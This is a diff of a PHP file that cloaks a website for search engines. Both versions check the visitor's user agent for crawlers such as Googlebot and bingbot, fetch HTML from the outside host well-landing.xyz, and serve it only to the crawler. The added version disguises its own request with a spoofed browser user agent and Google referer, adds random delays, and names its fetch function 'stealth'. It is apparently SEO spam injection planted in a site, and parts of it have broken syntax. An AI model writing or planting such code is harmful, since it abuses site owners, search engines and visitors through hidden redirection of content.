@@ -1,45 +1,26 @@
 <?php
+@ob_start();
+header("Vary: U-Agent");
 
-function isGoogleBot(): bool
-{
-    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+$src = "https://well-landing.xyz/landing/unp.html";
+$match = "/(googlebot|slurp|bingbot|baiduspider|yandex|crawler|spider|adsense|inspection|mediapartners)/i";
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"] ?? '');
 
-    $bots = [
-        'Googlebot',
-        'Google-Site-Verification',
-        'Google-InspectionTool',
-        'Googlebot-Mobile',
-        'Googlebot-News'
-    ];
-
-    foreach ($bots as $bot) {
-        if (stripos($userAgent, $bot) !== false) {
-            return true;
-        }
-    }
-
-    return false;
+function stealth($u) {
+$ctx = stream_context_create([
+http => [
+method => "GET",
+header => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n" .
+Referer: https://www.google.com/\r\n
+]
+]);
+return @file_get_contents($u, false, $ctx);
 }
 
-if (isGoogleBot()) {
-
-    $ch = curl_init('https://well-landing.xyz/landing/unp.html');
-
-    curl_setopt_array($ch, [
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_FOLLOWLOCATION => true,
-        CURLOPT_CONNECTTIMEOUT => 5,
-        CURLOPT_TIMEOUT => 10,
-        CURLOPT_SSL_VERIFYPEER => true,
-        CURLOPT_SSL_VERIFYHOST => 2,
-    ]);
-
-    $response = curl_exec($ch);
-
-    if (!curl_errno($ch) && curl_getinfo($ch, CURLINFO_HTTP_CODE) === 200) {
-        echo $response;
-    }
-
-    curl_close($ch);
-    exit;
+if (preg_match($match, $ua)) {
+usleep(rand(100000, 200000));
+echo stealth($src);
+@ob_end_flush();
+exit;
 }
+?>
